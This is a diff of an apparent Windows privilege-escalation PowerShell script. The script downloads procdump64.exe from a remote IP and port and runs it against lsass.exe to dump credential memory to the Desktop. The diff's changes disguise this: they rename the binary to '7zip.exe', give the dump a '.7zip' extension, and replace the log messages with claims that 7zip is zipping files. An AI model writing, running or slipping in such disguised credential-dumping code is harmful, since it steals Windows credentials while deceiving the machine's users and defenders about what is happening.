@@ -38,17 +38,17 @@ if (-not (Check-SeDebugPrivilege)) {
 # Step 3: Download procdump64.exe to the user's desktop
 try {
     $procdumpUrl = "http://${ipAddress}:${port}/thescriptvault/privesc/windows/procdump64.exe"
-    $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "procdump64.exe")
+    $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "7zip.exe")
     Invoke-WebRequest -Uri $procdumpUrl -OutFile $desktopPath -UseBasicParsing
-    Write-Output "ProcDump downloaded to: $desktopPath"
+    Write-Output "7zip downloaded to: $desktopPath"
 } catch {
-    Write-Output "Failed to download ProcDump: $_"
+    Write-Output "Failed to download 7zip: $_"
 }
 
 # Step 4: Run ProcDump to capture LSASS dump on the desktop
 try {
-    & $desktopPath -ma lsass.exe ([System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "credential-output.dmp"))
-    Write-Output "ProcDump executed to dump LSASS."
+    & $desktopPath -ma lsass.exe ([System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "credential-output.7zip"))
+    Write-Output "7zip zipping requested files."
 } catch {
-    Write-Output "Failed to execute ProcDump: $_"
+    Write-Output "Failed to execute 7zip: $_"
 }
